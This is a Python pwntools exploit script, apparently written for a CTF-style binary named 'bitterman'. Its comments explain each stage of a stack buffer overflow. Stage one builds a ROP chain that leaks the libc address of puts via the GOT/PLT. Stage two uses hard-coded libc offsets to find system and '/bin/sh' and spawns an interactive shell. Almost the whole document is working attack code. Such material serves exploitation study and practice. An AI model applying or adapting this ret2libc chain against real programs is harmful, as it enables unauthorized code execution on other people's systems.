#!/usr/bin/env python3

from pwn import *

context(terminal=['tmux','new-window'])
#p = gdb.debug('./bitterman','b main')
p = process('./bitterman')
context(os='linux',arch='amd64')
#context.log_level = 'DEBUG'

#Stage 0 check if can loop main
junk = ("A"*152).encode() #needs to be encoded into bytes so can be cated with plt_main
plt_main = p64(0x4006ec)
#payload = junk + plt_main
#Stage 1 leak puts libc addr
#to do this we need plt addr & got addrs in bin
plt_puts = p64(0x400520)
got_puts = p64(0x600c50)
#pop_rdi needed to overwrite rdi with addr of our choosing this is cuz rdi is
#1st arg in 64bit asm so next func call will use whatever we put ontop
#of the stack at that time as the 1st arg
pop_rdi = p64(0x400853)
payload = junk + pop_rdi + got_puts + plt_puts + plt_main

#wait and eat input til match
p.recvuntil("name?")
p.sendline("dialect")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")

p.sendline(payload)
p.recvuntil("Thanks!")
leaked_puts = p.recv(numb=8).strip().ljust(8,"\x00".encode())
log.success("Leaked libc addr of puts "+str(leaked_puts))
#Stage 2 using leaked libc puts calculate libc system and libc sh and launch a shell
libc_puts = u64(leaked_puts)
offset = libc_puts - 0x74ab0 #0x74ab0 - base offset of puts in libc got from doing readelf -s libc.so.6| grep puts
libc_system = p64(0x47850+offset) #0x47850 - base offset of system in libc got from doing readelf -s libc.so.6| grep system
libc_sh = p64(0x186cee+offset) #0x186cee - base offset of /bin/sh in libc gotten from strings -t x libc.so.6 | grep /bin/sh
payload = junk + pop_rdi + libc_sh + libc_system

p.recvuntil("name?")
p.sendline("dialect")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")
p.interactive()
